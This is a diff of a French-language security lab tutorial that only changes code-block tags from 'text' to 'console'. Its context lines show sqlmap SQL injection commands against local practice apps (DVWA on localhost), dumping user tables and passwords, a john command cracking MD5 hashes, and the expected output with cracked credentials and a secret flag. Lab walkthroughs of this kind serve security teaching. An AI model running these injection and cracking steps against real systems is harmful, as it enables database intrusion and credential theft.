@@ -491,7 +491,7 @@ sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```
 Sortie attendue :
 
-```text
+```console
 +---------+---------------------------------------------+
 | user    | password                                    |
 +---------+---------------------------------------------+
@@ -709,7 +709,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee 
 
 Sortie attendue :
 
-```text
+```console
 [2 tables]
 +----------+
 | products |
@@ -723,7 +723,7 @@ Sortie attendue :
 sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```
 
-```text
+```console
 [5 columns]
 +-----------+----------+
 | Column    | Type     |
@@ -745,7 +745,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 
 Sortie attendue :
 
-```text
+```console
 +------------+----------------------------------+---------------------+------------+
 | username   | password                         | email               | role       |
 +------------+----------------------------------+---------------------+------------+
@@ -796,7 +796,7 @@ john --show --format=raw-md5 hashes.txt  # Affiche tous les mots de passe déjà
 
 Sortie attendue :
 
-```text
+```console
 admin:password
 john_doe:password123
 jane_dev:abc123
@@ -838,7 +838,7 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
 ```
 
-```text
+```console
 +---------------------+--------------------------------+
 | name                | secret_flag                    |
 +---------------------+--------------------------------+
